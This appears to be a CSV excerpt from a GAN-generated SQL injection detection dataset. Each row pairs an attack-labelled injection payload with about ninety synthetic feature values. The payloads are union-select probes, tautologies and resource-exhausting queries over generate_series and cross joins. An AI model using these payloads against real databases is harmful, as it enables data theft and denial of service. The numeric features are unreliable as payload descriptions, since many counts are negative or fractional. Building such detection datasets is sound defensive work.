id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000056,attack,boolean,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",nearest_attack_euclidean,R002753,7.248515128377329,145.62667846679688,69.8352279663086,20.517284393310547,53.339542388916016,3.9327898025512695,41.9595832824707,19.47098159790039,0.9986892342567444,0.5548253655433655,-0.08233192563056946,0.22581584751605988,0.08490266650915146,2.9465134143829346,1.7999367713928223,1.291435956954956,-1.237438678741455,0.5696203708648682,-0.10234462469816208,-0.12720370292663574,2.7989542484283447,8.27343463897705,4.610720157623291,0.00926914531737566,0.1894930899143219,0.1697092056274414,0.0008379655191674829,0.2711181342601776,0.8685760498046875,0.7398553490638733,-0.08263339102268219,0.008858823217451572,-0.13691174983978271,0.547142505645752,0.3097957372665405,0.1789122372865677,-0.39530012011528015,1.0673911571502686,0.5694594979286194,0.6026053428649902,-0.24838371574878693,0.829636812210083,0.3149961233139038,0.21428970992565155,0.1755369007587433,-0.02853844314813614,0.053011368960142136,0.04306962713599205,0.36963585019111633,0.26472586393356323,0.4099177420139313,0.1734902560710907,-0.33148783445358276,0.09051742404699326,0.11499787867069244,0.04946393892168999,0.1552475392818451,0.18717293441295624,-0.07414832711219788,-0.551599383354187,0.0012307660654187202,0.3716522753238678,0.016975782811641693,-0.4713648855686188,0.24001812934875488,0.010857190936803818,-0.08597977459430695,0.2458983212709427,0.07970157265663147,0.007295049726963043,-0.021946178749203682,-0.0010655951919034123,-0.004618827719241381,-0.08093524724245071,-0.011433569714426994,0.056443121284246445,1.3195477724075317,-0.03278205171227455,0.022182324901223183,0.2404697984457016,-0.06699365377426147,2.5580813884735107,0.6101206541061401,-0.04141228646039963,0.30162927508354187,-0.13207904994487762,-0.051989492028951645,-0.6718050241470337,0.06754348427057266
GAN_000057,attack,union,"-3437  )   union all select 7774,7774,7774--",nearest_attack_euclidean,R008340,6.711001563636277,-41.38591766357422,15.755245208740234,15.845282554626465,-30.879409790039062,-0.35330143570899963,0.8495620489120483,0.4232597053050995,1.00083589553833,0.30867692828178406,0.29534515738487244,0.08207859843969345,0.12030350416898727,2.523719549179077,-0.4461093842983246,0.3070569634437561,2.2552030086517334,0.6175190806388855,0.13519777357578278,-0.026948150247335434,0.31552430987358093,-1.1132080554962158,4.341282844543457,0.02809973992407322,-1.106722354888916,0.07950381934642792,-0.04154537618160248,0.2548867464065552,-0.2078542560338974,0.6568751931190491,-0.05579975247383118,-0.026444928720593452,-0.6137635111808777,0.14664404094219208,1.830261468887329,-0.48553961515426636,-0.014847958460450172,-0.29894307255744934,0.3425544202327728,1.0180597305297852,0.37155139446258545,-0.21990913152694702,0.12818457186222076,0.06519447267055511,-0.002995918970555067,-0.06294774264097214,0.023186100646853447,-0.37425628304481506,-0.03361310437321663,0.13913695514202118,-0.04291350767016411,-0.22461245954036713,-0.19642038643360138,-0.010858088731765747,0.06103220209479332,-0.04634179174900055,0.10744792968034744,0.4988003969192505,-0.0012459272984415293,-0.4712735116481781,0.008270079270005226,1.2658532857894897,0.006029067561030388,0.2225375771522522,0.20101803541183472,0.0568445660173893,-0.2396726906299591,-0.393968403339386,-0.19471359252929688,-0.004235505126416683,-0.014937952160835266,-0.01030154898762703,0.0039967079646885395,-0.041599784046411514,-0.003225958440452814,0.22763022780418396,-0.5237417817115784,0.63957679271698,0.00994553230702877,0.20205171406269073,-0.0401223860681057,1.385177731513977,0.05523984134197235,0.8503679633140564,-0.35326218605041504,0.18574947118759155,-0.19547562301158905,0.39813753962516785,0.03759748116135597
GAN_000058,attack,boolean,"1""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R006540,8.144267472457614,195.6266632080078,44.31013107299805,54.830780029296875,113.67906951904297,1.460216999053955,59.05595779418945,33.58990478515625,1.000280737876892,0.29625311493873596,0.30611807107925415,0.45337337255477905,0.12488202005624771,2.9844048023223877,2.5325896739959717,2.209043502807617,1.441946029663086,0.18141049146652222,0.013178042136132717,0.027022361755371094,10.902729988098145,12.005339622497559,3.628345251083374,0.007375091779977083,1.007243275642395,0.10872401297092438,0.14453932642936707,0.4723811447620392,0.35494688153266907,0.17309783399105072,0.11522635072469711,0.053386688232421875,-0.608989417552948,0.5215680003166199,1.062719702720642,1.4317179918289185,3.3511061668395996,0.7063319087028503,0.2020481675863266,0.5713354349136353,0.24740871787071228,-0.12410580366849899,-0.38394251465797424,0.34918224811553955,0.086529940366745,-0.07904369384050369,0.03537438437342644,0.6295868158340454,0.25269725918769836,0.21127817034721375,0.8666085004806519,0.16997019946575165,-0.27612102031707764,0.1206599697470665,0.10858723521232605,-0.007156006526201963,0.08581575006246567,-0.28154268860816956,-0.043717458844184875,-0.5828306674957275,0.0019710101187229156,0.26740562915802,-0.019209591671824455,-0.7859030961990356,0.2915627062320709,0.021674223244190216,0.044464629143476486,0.29458773136138916,0.3203698992729187,-0.010827734135091305,0.027555590495467186,0.0026424473617225885,-0.004340872168540955,0.10121303796768188,0.01649271324276924,0.08840358257293701,0.4246145784854889,0.6229017376899719,0.022437402978539467,0.2867581844329834,0.18425026535987854,9.225269317626953,0.2803806662559509,-0.18966884911060333,-0.19110968708992004,-0.022984638810157776,0.010806898586452007,-0.28931331634521484,0.03217906504869461
GAN_000059,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006694,6.228827461978543,29.1108341217041,10.114519119262695,13.813826560974121,44.534820556640625,1.0947649478912354,58.496177673339844,10.518362045288086,1.00141179561615,0.20878875255584717,0.13968686759471893,0.38904228806495667,0.17815691232681274,3.561370611190796,1.7670564651489258,0.39804020524024963,1.2992035150527954,0.34922415018081665,0.054143376648426056,0.015984974801540375,4.186420440673828,8.526158332824707,0.8941001296043396,-0.0019211112521588802,1.386639952659607,0.0671679675579071,-0.09423770755529404,0.25192946195602417,0.43206456303596497,1.109142541885376,0.05238320678472519,-0.009360273368656635,0.48162660002708435,0.25623542070388794,1.2092657089233398,1.0055843591690063,-2.1297075748443604,0.5427369475364685,-0.6713609099388123,-0.18112440407276154,0.4784638583660126,0.2927836775779724,0.39244216680526733,0.14391833543777466,0.034445181488990784,0.07780078798532486,0.05988546088337898,-0.06650920957326889,0.008892664685845375,-0.1116587370634079,-0.020427057519555092,-0.2324451059103012,0.42258894443511963,-0.06887336820363998,-0.02329299785196781,-0.013515380211174488,0.07382331043481827,0.2407536804676056,-0.07354229688644409,0.04123286157846451,0.006879158318042755,0.800524115562439,0.0018652576254680753,0.3919091522693634,0.13796158134937286,-0.03058767504990101,-0.30880028009414673,-0.534670352935791,-0.16559037566184998,0.0020425438415259123,0.004379970952868462,-0.007530647329986095,0.005128289107233286,0.00546806026250124,-0.019574878737330437,0.0984349399805069,1.195028305053711,1.144654631614685,-0.016833309084177017,-0.11860091984272003,-0.2191600650548935,2.1951541900634766,1.2886379957199097,-0.3328917622566223,0.4205833077430725,0.23109135031700134,-0.2113802433013916,0.5529512763023376,0.048568155616521835
GAN_000060,attack,boolean,-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,nearest_attack_euclidean,R001912,7.182092107235935,14.546189308166504,-11.255748748779297,28.64884376525879,56.20436477661133,1.8403756618499756,67.54033660888672,9.055142402648926,1.0026183128356934,0.023002194240689278,0.2571341097354889,0.4881035089492798,0.20687690377235413,3.377403497695923,3.8147876262664795,0.9168258905410767,1.4547585248947144,0.25963762402534485,0.12586690485477448,0.02272491157054901,6.956485271453857,9.289460182189941,-0.9469578862190247,0.019527336582541466,1.999866008758545,0.0951964482665062,-0.0403861403465271,0.48192477226257324,0.5973392724990845,0.8456589579582214,0.11532781273126602,-0.03496893122792244,0.7279480695724487,0.5454185605049133,1.2002161741256714,1.2194571495056152,-3.021730661392212,0.8853111863136292,-1.0922547578811646,-0.24002452194690704,0.4826902449131012,-0.22036528587341309,0.08915773034095764,0.23658081889152527,-0.008266081102192402,0.05970524251461029,0.07594454288482666,0.3750477731227875,0.0015472269151359797,-0.08975641429424286,0.11119689792394638,-0.13767670094966888,0.15168094635009766,-0.06199069693684578,-0.025424687191843987,-0.02342701144516468,0.03921191766858101,-0.05471562221646309,-0.08748894929885864,-0.12518708407878876,0.0033078284468501806,1.0300358533859253,-0.010226131416857243,-1.3169560432434082,0.149631068110466,-0.039494745433330536,-0.3237941265106201,-0.42713749408721924,-0.10636637359857559,-0.0031217308714985847,0.015010640025138855,-0.012047923170030117,0.0032712905667722225,-0.005570082925260067,-0.002121226629242301,0.16600774228572845,1.0015826225280762,1.1285427808761597,-0.00893348827958107,-0.09397193789482117,-0.15880832076072693,5.714782238006592,1.0777431726455688,-0.6231436133384705,0.29830923676490784,0.3108532726764679,-0.155687153339386,0.7189392447471619,0.06332921981811523
GAN_000061,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R001378,6.36718419393621,92.51434326171875,7.028446197509766,44.15398025512695,28.897428512573242,-0.6890741586685181,52.35459518432617,15.96829605102539,1.0004551410675049,0.08706359565258026,0.4991653561592102,0.3174613416194916,0.11780201643705368,3.0069162845611572,1.1259018182754517,0.3346649706363678,2.7809088230133057,0.32694053649902344,0.13012903928756714,0.11037681251764297,4.666162490844727,7.258288383483887,3.0238840579986572,-0.023327602073550224,0.22008541226387024,0.015459026210010052,-0.008883840404450893,-0.19562728703022003,0.22823771834373474,-0.08371443301439285,0.09639676660299301,-0.011207759380340576,-0.48876139521598816,0.8444789052009583,1.7931110858917236,0.8694055080413818,-1.107407569885254,0.24046893417835236,0.19268940389156342,0.5533266663551331,0.8494112491607666,-0.40293389558792114,-0.23096488416194916,0.2236364483833313,-0.03157280385494232,-0.00849216990172863,0.009084424003958702,0.30727460980415344,0.025312678888440132,0.056839872151613235,0.5325146913528442,-0.288210391998291,-0.45638906955718994,-0.016827451065182686,0.011502241715788841,-0.04688316956162453,0.02962234616279602,0.18203870952129364,0.00579841760918498,-0.17658217251300812,0.0028516591992229223,0.8555486798286438,-0.0032244944013655186,1.1783194541931152,0.16524243354797363,0.0227154903113842,0.034687843173742294,0.16666977107524872,0.4011876583099365,-0.016425838693976402,0.02367350459098816,-0.00023395547759719193,0.008631661534309387,0.07087990641593933,-0.02191067300736904,0.10809656977653503,-0.4694875180721283,0.6908711791038513,0.003622916992753744,0.08517736196517944,-0.028832126408815384,4.79180908203125,0.26372477412223816,0.5950834155082703,-0.36600902676582336,0.18356043100357056,-0.09058309346437454,0.2238282412290573,0.04345597326755524
GAN_000062,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,6.464549542788768,198.39111328125,42.967411041259766,44.78190612792969,94.17301177978516,1.5575624704360962,57.040645599365234,24.491186141967773,0.9993543028831482,0.36967143416404724,0.19406022131443024,0.3870983421802521,0.11478057503700256,3.1819679737091064,3.0476160049438477,1.2340284585952759,0.15180747210979462,0.2990940511226654,0.015574770979583263,-0.009971581399440765,7.798449993133545,11.001313209533691,3.6790473461151123,-0.0002971475478261709,0.8813002109527588,0.0844382494688034,0.08240956813097,0.15031127631664276,1.18998384475708,0.09769400209188461,0.09440679103136063,0.012205781415104866,-0.217500239610672,0.695965588092804,0.48037996888160706,1.0095243453979492,1.5406147241592407,1.3090225458145142,0.3145197927951813,0.46280989050865173,0.0916416272521019,-0.071113221347332,-0.15653081238269806,0.2702183127403259,0.08457103371620178,-0.053481508046388626,0.05153791606426239,0.4900064766407013,0.40627390146255493,0.3137393891811371,0.6842965483665466,0.2603859305381775,-0.07547441124916077,0.08100905269384384,0.06198320910334587,0.03356257453560829,0.07676190137863159,-0.03933756425976753,-0.04489879682660103,-0.34990471601486206,0.0013684533769264817,0.24912798404693604,0.0017448903527110815,-0.4812637269496918,0.18013393878936768,0.04956559091806412,0.022215358912944794,0.2624932527542114,0.23085825145244598,-0.0012163639767095447,-0.01768384873867035,0.00538089033216238,-0.0022186150308698416,0.026012655347585678,-0.005270075984299183,0.004155258182436228,0.8056920170783997,0.21044114232063293,0.022083207964897156,0.28122463822364807,0.0712856724858284,7.348859786987305,0.3108287453651428,-0.06266573816537857,0.08348686248064041,-0.06774947792291641,0.023512190207839012,-0.4931677281856537,0.05198824405670166
GAN_000063,attack,union,"-7008'   )    )    union all select 9080,9080,9080#",nearest_attack_euclidean,R006574,5.177082258785209,-40.75611114501953,7.0380401611328125,11.546767234802246,-20.441078186035156,-0.5070464015007019,0.7160896062850952,0.37344929575920105,1.0010665655136108,0.19476155936717987,0.2558693587779999,0.22300037741661072,0.12674684822559357,2.7201552391052246,1.694907546043396,0.13628771901130676,0.9575770497322083,0.5564483404159546,0.08911078423261642,-0.01574365794658661,-0.1084161028265953,-0.10600161552429199,2.790900230407715,0.02148270420730114,-0.1741691529750824,0.06345770508050919,-0.013127296231687069,0.002320736413821578,0.4908817410469055,0.44290199875831604,-0.08944723755121231,-0.046817511320114136,0.19049625098705292,0.31490370631217957,1.0330278873443604,-0.020504044368863106,-2.651987314224243,0.44010478258132935,0.17004965245723724,0.49592360854148865,0.3848665654659271,-0.24653297662734985,0.23811203241348267,0.10459563136100769,0.030460380017757416,-0.022664599120616913,0.005248163361102343,0.03714107349514961,0.07533178478479385,0.16940884292125702,-0.1516346037387848,-0.11949019134044647,0.08961586654186249,-0.007246887777000666,-0.016166554763913155,-0.006992812734097242,0.0885985940694809,0.32157355546951294,-0.011550086550414562,-0.4915669858455658,0.0034906119108200073,0.8517240285873413,0.008882234804332256,-0.24545547366142273,0.08287513256072998,0.05261186882853508,-0.15963402390480042,-0.26827460527420044,0.09009751677513123,0.000751343322917819,-0.016233311966061592,-0.011214842088520527,0.003912824671715498,-0.06342390179634094,-0.009152623824775219,0.13544951379299164,0.3400750756263733,0.2787896692752838,0.002945686923339963,0.09209265559911728,-0.11845222860574722,1.4948359727859497,0.2144579142332077,0.4829201102256775,-0.08452339470386505,0.21240319311618805,-0.1030803695321083,0.3244818449020386,0.04663725197315216
GAN_000064,attack,boolean,-9556'  )   where 2472  =  2472 or   (  2883  =  9968  )  *9968--,nearest_attack_euclidean,R004209,9.118251421579796,41.535614013671875,-9.614288330078125,30.759756088256836,70.4473648071289,0.4076542556285858,82.70337677001953,17.491878509521484,1.0028903484344482,-0.020486129447817802,0.4100046455860138,0.43457740545272827,0.2190687507390976,3.655491590499878,2.241750955581665,0.49405521154403687,3.4972331523895264,0.1876985728740692,0.10922062397003174,0.10024214535951614,11.117193222045898,11.217864990234375,-0.767952024936676,-0.038264524191617966,1.5504257678985596,0.03660888969898224,-0.10678032785654068,0.21236126124858856,-0.6696383953094482,1.2062262296676636,0.1678640991449356,-0.013517508283257484,0.45794183015823364,0.5165382623672485,2.149030923843384,1.7020405530929565,-2.9380056858062744,0.27957719564437866,-1.13581383228302,-0.5276501178741455,0.8862556219100952,0.019878365099430084,0.21513697504997253,0.22562992572784424,-0.06469237804412842,0.11451797187328339,0.08300773799419403,0.13766825199127197,-0.2517872750759125,-0.36748206615448,0.1284169703722,-0.5333425402641296,0.17273132503032684,-0.1827927678823471,-0.0720362588763237,-0.07832366973161697,0.05029415339231491,-0.1538904905319214,-0.05925144627690315,0.45870357751846313,0.008457730524241924,1.231278657913208,-0.013467990793287754,0.5883932709693909,0.19702352583408356,-0.06767001748085022,-0.4076421856880188,-0.8418024182319641,-0.21806490421295166,-0.012900978326797485,0.05327531322836876,-0.0024597872979938984,0.012709149159491062,0.11121250689029694,-0.023844102397561073,0.14141212403774261,0.4540761113166809,1.939967155456543,-0.032734230160713196,-0.19842012226581573,-0.2138601690530777,5.097020149230957,1.4260154962539673,-0.5083385705947876,0.1974634826183319,0.4095636010169983,-0.26708582043647766,1.274376630783081,0.05954734981060028
GAN_000065,attack,boolean,"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R003224,4.492597640499396,101.22970581054688,46.11619567871094,12.954630851745605,42.400203704833984,2.1784329414367676,47.63383483886719,15.657843589782715,0.9995750784873962,0.41552209854125977,0.06825196743011475,0.28230229020118713,0.12777139246463776,3.4639625549316406,0.8076209425926208,0.6403347253799438,0.3767116069793701,0.3655441999435425,0.0063415756449103355,-0.030309230089187622,2.038585662841797,6.291049003601074,2.8000800609588623,0.0004371986724436283,0.8352180123329163,0.08316535502672195,-0.048827216029167175,0.27664920687675476,0.5146160125732422,0.8404673337936401,-0.0034558933693915606,-0.0073794717900455,0.20872515439987183,0.16082121431827545,0.6972532868385315,0.6146621108055115,0.8524413704872131,0.6761437058448792,0.2873391807079315,0.22881627082824707,0.11957501620054245,0.6173706650733948,0.34287261962890625,0.10465161502361298,0.058100659400224686,0.023704806342720985,0.03987240418791771,-0.09806235879659653,0.18972516059875488,0.10160738229751587,0.21219433844089508,0.002491933526471257,0.1198585107922554,0.0010988503927364945,0.03580863028764725,0.016986694186925888,0.07496137171983719,0.2548570930957794,-0.04863157868385315,-0.10633420944213867,0.002862433437258005,0.4443211555480957,0.008989356458187103,0.7317323088645935,0.12342610210180283,-0.024233805015683174,-0.12515580654144287,-0.1857859492301941,0.056131526827812195,0.005183778237551451,-0.0065125408582389355,-0.001544092665426433,0.0016658988315612078,-0.027926871553063393,-0.014149715192615986,0.05455063283443451,0.9830889701843262,0.47824665904045105,0.001781374216079712,0.0846673995256424,-0.08665873855352402,2.4389705657958984,0.8338080644607544,0.019796796143054962,0.33604708313941956,0.07532169669866562,-0.09508659690618515,-0.039710335433483124,0.04010409489274025
GAN_000066,attack,boolean,"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R003224,6.977116015104851,42.228050231933594,24.7425479888916,9.181735038757324,43.99271774291992,3.5540599822998047,67.4678726196289,9.485858917236328,1.0000602006912231,0.39718517661094666,-0.017613250762224197,0.33756133913993835,0.13139790296554565,3.4402077198028564,1.9439116716384888,0.9933808445930481,-0.5752628445625305,0.5206534266471863,-0.04089684411883354,-0.061460886150598526,3.2505459785461426,8.6597261428833,1.8326091766357422,0.017539799213409424,1.0398207902908325,0.15078960359096527,-0.09373576939105988,0.26277539134025574,1.200888991355896,1.1153231859207153,-0.05145542323589325,-0.010120468214154243,0.254410982131958,0.21356666088104248,0.7327994108200073,0.37155377864837646,-2.9867632389068604,0.9207891821861267,-0.5307883620262146,0.16445134580135345,0.09717991203069687,0.5940419435501099,0.4447174072265625,0.187278613448143,0.11898405104875565,0.0246165469288826,0.09061236679553986,-0.09478390961885452,0.18849466741085052,0.10656004399061203,0.19716736674308777,-0.12009559571743011,0.37277525663375854,-0.002227500546723604,0.07211344689130783,0.037500303238630295,0.10103139281272888,0.22156117856502533,-0.08551304787397385,-0.2483762502670288,0.003233298659324646,0.9865780472755432,0.014492293819785118,-0.15835067629814148,0.19716876745224,-0.021953601390123367,-0.4180912673473358,-0.1745470017194748,-0.10108627378940582,0.008532263338565826,-0.032233826816082,-0.006796295288950205,0.0015193951549008489,-0.04594840109348297,-0.02497304417192936,0.0763876661658287,1.422826886177063,0.7752063870429993,-0.0035847537219524384,-0.0684342235326767,-0.2225782424211502,1.2230709791183472,1.2282167673110962,-0.27430295944213867,0.5317790508270264,0.01306365430355072,-0.1724245697259903,-0.0018568821251392365,0.09314220398664474
GAN_000067,attack,boolean,"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004668,6.937870629004186,55.43533706665039,25.276891708374023,19.746618270874023,74.84194946289062,3.2452149391174316,67.29524993896484,11.87389087677002,1.0004634857177734,0.35151207447052,0.0028019363526254892,0.38114896416664124,0.172581747174263,3.515150547027588,1.3681174516677856,0.8662834763526917,0.5687018632888794,0.48991063237190247,0.018297798931598663,-0.04279334843158722,3.740576982498169,11.461956024169922,2.7331743240356445,0.010377085767686367,1.2629585266113281,0.17438028752803802,-0.09347951412200928,0.6847442388534546,0.8151361346244812,1.3173476457595825,-0.004637123551219702,0.007139053661376238,-0.02716425620019436,0.1901392638683319,1.1209278106689453,0.6669899821281433,-0.5949336886405945,0.6436973810195923,-0.9283843636512756,0.19028602540493011,0.039852701127529144,0.4953814446926117,0.3123057782649994,0.1588359773159027,0.06760720908641815,0.01510484516620636,0.07444716989994049,-0.11778413504362106,0.13122791051864624,-0.009672937914729118,0.1924457848072052,-0.0765046775341034,0.3661174178123474,0.006292927544564009,0.08941447734832764,0.024509361013770103,0.12106514722108841,0.27731359004974365,-0.09978529810905457,-0.2896707355976105,0.004260692745447159,0.6662389636039734,0.0020007439889013767,-0.21479830145835876,0.20097893476486206,-0.04162462428212166,-0.4136878252029419,-0.31263601779937744,-0.1456061452627182,0.008525311946868896,-0.029261618852615356,-0.0059397597797214985,-0.0013447756646201015,-0.006725260056555271,-0.007455310318619013,0.12617172300815582,1.4535115957260132,1.1430867910385132,-0.008635886944830418,-0.06133157014846802,-0.1515069603919983,2.577871799468994,1.2504587173461914,-0.340116024017334,0.4977031648159027,-0.0008913129568099976,-0.2146138995885849,0.0008252747356891632,0.05948438495397568
GAN_000068,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R005877,6.7351951236132654,132.8083953857422,64.30282592773438,26.759902954101562,52.481998443603516,1.7232896089553833,34.03617858886719,18.70279884338379,0.9988214373588562,0.5891510248184204,0.02310306951403618,0.20791131258010864,0.09158686548471451,2.932628870010376,1.1318888664245605,1.5002355575561523,-0.2644633650779724,0.5035165548324585,-0.033720713108778,-0.10029991716146469,4.238563537597656,8.204629898071289,5.471275806427002,0.021984510123729706,-0.009740568697452545,0.14166772365570068,0.006897802464663982,0.42598244547843933,0.6042126417160034,0.6482434272766113,-0.034426890313625336,0.0034522416535764933,-0.3607877790927887,0.12658245861530304,0.6612769365310669,0.08778996765613556,2.3938891887664795,0.7083037495613098,0.946025550365448,0.9208850860595703,-0.14405490458011627,0.44233274459838867,0.051481589674949646,0.19622802734375,0.11942976713180542,-0.05952799692749977,0.054351817816495895,-0.010287931188941002,0.3009459674358368,0.3358401358127594,0.4569205939769745,0.2071070820093155,-0.19792108237743378,0.0994943380355835,0.1475180834531784,0.02691269852221012,0.13488663733005524,0.19280152022838593,-0.05481499806046486,-0.411865234375,0.0005137452390044928,0.4910118579864502,0.011847122572362423,-0.3812728226184845,0.2531842291355133,0.042839642614126205,-0.053302962332963943,0.06604596972465515,-0.12334930151700974,0.002703700214624405,-0.02276092767715454,-0.001172600663267076,-0.004767963197082281,-0.062327682971954346,-0.001648081699386239,0.07210885733366013,0.6838655471801758,0.2569601535797119,0.028530696406960487,0.27455228567123413,0.040105801075696945,3.873911142349243,0.3678349256515503,0.11239063739776611,0.040137387812137604,-0.11757666617631912,-0.04321568086743355,-0.5194652676582336,0.05054674297571182
GAN_000069,attack,boolean,"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'istb'  =  'istb",nearest_attack_euclidean,R006822,8.568074086007432,159.67733764648438,31.367496490478516,33.31669235229492,122.1064682006836,3.0329205989837646,96.7948989868164,27.8651180267334,1.0014152526855469,0.2934074401855469,0.05634326860308647,0.5388712286949158,0.19988057017326355,3.9563121795654297,2.5869545936584473,1.243888258934021,1.2662924528121948,0.24721696972846985,-0.005385209806263447,-0.0062997047789394855,11.558016777038574,15.357202529907227,0.2866435945034027,-0.011544870212674141,2.2363569736480713,0.1407867819070816,-0.031783439218997955,0.5510810613632202,0.4964134097099304,1.384270429611206,0.1507905125617981,0.02214485965669155,0.19648824632167816,0.4208139181137085,1.1210919618606567,2.213850259780884,0.6191447377204895,0.8398044109344482,-0.9318229556083679,-0.3953372836112976,0.4229213297367096,0.5527110695838928,0.3498596251010895,0.2419337034225464,0.07993512600660324,0.062283940613269806,0.1018720269203186,0.19851234555244446,0.05367807671427727,-0.16594500839710236,0.40694692730903625,-0.11550725996494293,0.06932568550109863,-0.02816970832645893,0.05742640048265457,-0.010301142930984497,0.0938536524772644,-0.19137562811374664,-0.09850247949361801,0.12991324067115784,0.004242945462465286,0.5018638968467712,-0.010840056464076042,0.46798592805862427,0.23510539531707764,-0.06638751924037933,-0.3913992941379547,-0.3920319676399231,-0.355120986700058,-0.0018849780317395926,0.025255272164940834,0.0008805899997241795,0.000522393558640033,0.10387256741523743,-0.014226483181118965,0.09920497238636017,1.53178870677948,1.4552158117294312,-0.016375895589590073,-0.06114576756954193,-0.12558570504188538,6.875687599182129,1.6153483390808105,-0.9144976735115051,0.6165335178375244,0.14389032125473022,-0.2010585218667984,0.6247541904449463,0.05680637061595917
GAN_000070,attack,union,"1%"" union all select null,null,null,null,null,null--",nearest_attack_euclidean,R003410,6.669750158167345,1.8851710557937622,53.716041564941406,8.057319641113281,2.6380422115325928,1.3702725172042847,17.274682998657227,6.565382957458496,0.9994952082633972,0.5157135128974915,0.08431689441204071,0.08780955523252487,0.10902464389801025,2.795393943786621,-1.1501613855361938,0.9370681047439575,1.5787416696548462,0.5597389936447144,0.11014222353696823,-0.08888634294271469,-0.5473313331604004,1.503441572189331,5.406273365020752,0.028929177671670914,-0.6757824420928955,0.12729886174201965,-0.04136032983660698,0.7558215260505676,-0.27458712458610535,1.066859245300293,-0.05041218549013138,-0.0016912907594814897,-0.40631529688835144,-0.1789121925830841,1.4610342979431152,-0.5027171969413757,2.232961654663086,-0.15846888720989227,0.6601502299308777,0.9479734301567078,-0.049904175102710724,0.1907825917005539,0.2709020972251892,0.08996457606554031,0.0437467060983181,-0.07878819108009338,0.07943914830684662,-0.5761168599128723,0.10202228277921677,0.21189084649085999,0.10150082409381866,-0.04034445062279701,-0.11469724774360657,0.010809557512402534,0.09516962617635727,-0.02538858726620674,0.14580315351486206,0.43025538325309753,-0.052245013415813446,-0.5247697830200195,0.007588561624288559,0.7671284675598145,0.0063258023001253605,-0.031030677258968353,0.23383669555187225,0.00974038802087307,-0.23324209451675415,-0.5614238977432251,-0.2617034912109375,0.003669450292363763,-0.0018920641159638762,-0.00972558744251728,-0.0022679981775581837,-0.07402791827917099,0.004496597684919834,0.17657087743282318,0.14409330487251282,0.7639366984367371,0.01753706857562065,0.20746761560440063,4.3120911868754774e-05,0.6275526881217957,0.36529645323753357,0.4720655381679535,-0.16613569855690002,0.11876702308654785,-0.1771089732646942,0.12883026897907257,0.029606768861413002
